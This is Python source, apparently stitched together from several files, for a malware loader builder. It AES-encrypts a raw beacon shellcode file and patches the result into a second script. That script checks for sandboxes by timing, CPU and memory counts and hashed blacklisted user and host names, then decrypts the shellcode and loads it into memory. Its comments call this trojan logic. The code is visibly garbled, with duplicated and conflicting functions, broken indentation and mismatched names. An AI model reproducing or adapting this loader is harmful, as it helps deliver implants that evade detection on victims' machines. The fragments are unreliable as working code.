import base64
from common.Crypto import processing
from common.Path import processing
  import re
from step1 import gen_aes_payload
from common.project_path import processing
from loguru import logger


"""
Encrypts the raw payload in AES-256-GCM format and generates 'shellcode_cipher.tmp'.
"""



def gen_aes_payload():
Crypto = CryptoUtils()
  path = Path()
    with open(project_path.get_project_path() + "/bean_raw/beacon.bin", "rb") as f:
        shellcode = f.read()
    shellcode_cipher = crypto_utils.get_key()
    shellcode_cipher += b"||split||"
    shellcode_cipher += crypto_utils.encrypt(shellcode)
    with open(project_path.get_project_path() + "/resource/shellcode_cipher.tmp", "wb") as f:
        f.write(base64.b64encode(shellcode_cipher))

            import time
import base64
import threading
from hashlib import sha256
import psutil
from getpass import getuser
from socket import gethostname

def get_sanbox1():
    users = ["3e93bb7b2887e4881fa7da105c8d95b1893a8373e2e24bee8460dcb69bd3cf04", "2cd7b171d2155f0878a5b89ac6fea662241d05e7ef1555452a92006d2a7021f9", "7707505e68f824301174b8824a9b9df32605193986fbcb61d0a18d0d28cf9e56", "414efb531d1cb23f5778650492d0c7cae356a9633479ef59b1e2169ff9823265", "8af67b85a6d66d4c84eb00dc9b4a662a88be1f6339c343f0f27403745ca5fec5"]
    return users

def get_sanbox2():
    computers = ["3e93bb7b2887e4881fa7da105c8d95b1893a8373e2e24bee8460dcb69bd3cf04", "2cd7b171d2155f0878a5b89ac6fea662241d05e7ef1555452a92006d2a7021f9", "7707505e68f824301174b8824a9b9df32605193986fbcb61d0a18d0d28cf9e56", "414efb531d1cb23f5778650492d0c7cae356a9633479ef59b1e2169ff9823265", "8af67b85a6d66d4c84eb00dc9b4a662a88be1f6339c343f0f27403745ca5fec5"]
    return computers

def hash_name(i_str: str):
    i_str += "CanUGuessMe?"
    return sha256(i_str.encode()).hexdigest()

def vmware():
    logger.debug("开始执行沙箱检测逻辑")
    total = round(psutil.virtual_memory().total / (1024.0 * 1024.0 * 1024.0), 2)
    pre = int(time.time())
    user = getuser()
    computer = gethostname()

    time.sleep(2)
    now = int(time.time())
    if now - pre < 2 or cpu_count() < 3 or total < 2 or hash_name(user) in get_sanbox_users() or hash_name(computer) in get_sanbox_computers():
        logger.debug("检测到沙箱")
        exit(0)

def pwn():
    vmware()
    shellcode_raw = b"666666666666"  # 待替换的shllcode
    shellcode = base64.b64decode(shellcode_raw)
    key, cipher = shellcode.split(b"||split||")
    crypto_utils.key = key
    plain_text_raw = crypto_utils.decrypt(cipher)
    LoadMemory.load_memory(plain_text_raw)

def run():
    t = threading.Thread(target=pwn)
    t.start()
    t.join()


def l1():
    with open(project_path.add_abs_path("/step2.py"), "r+", encoding="utf-8") as f1:
        with open(project_path.add_abs_path("/resource/shellcode_cipher.tmp"), "rb") as f2:
            step2 = f1.read()
            shellcode_cipher = f2.read()
            new_string = re.sub(r"shellcode_raw = b\"(.*?)\"", 'shellcode_raw = b"' + shellcode_cipher.decode() + '"' , step2)
            logger.debug(f'木马逻辑: {new_string}')

    with open(project_path.add_abs_path("/step2.py"), 'w', encoding="utf-8") as f1:
        f1.write(new_string)
        import base64

from common.crypto_utils import crypto_utils
# from loguru import logger
from common.project_path import project_path
"""
对raw格式的payload进行AES-256-GCM加密
生成shellcode_cipher.tmp
"""


def gen_aes_payload():
    with open(project_path.get_project_path() + "123.bin", "rb") as f:
        shellcode = f.read()
    shellcode_cipher = crypto_utils.get_key()
    shellcode_cipher += b"||split||"
    # logger.debug(f"key: {crypto_utils.get_key()}")
    shellcode_cipher += crypto_utils.encrypt(shellcode)
    # print(shellcode_cipher)
    # logger.debug(shellcode_cipher)
    with open(project_path.get_project_path() + "/resource/shellcode_cipher.tmp", "wb") as f:
        f.write(base64.b64encode(shellcode_cipher))
    # logger.info("payload 加密成功")
    # logger.info(f.name)




if __name__ == '__main__':
    gen_aes_payload()
     vmware()
     run()
     
   
   

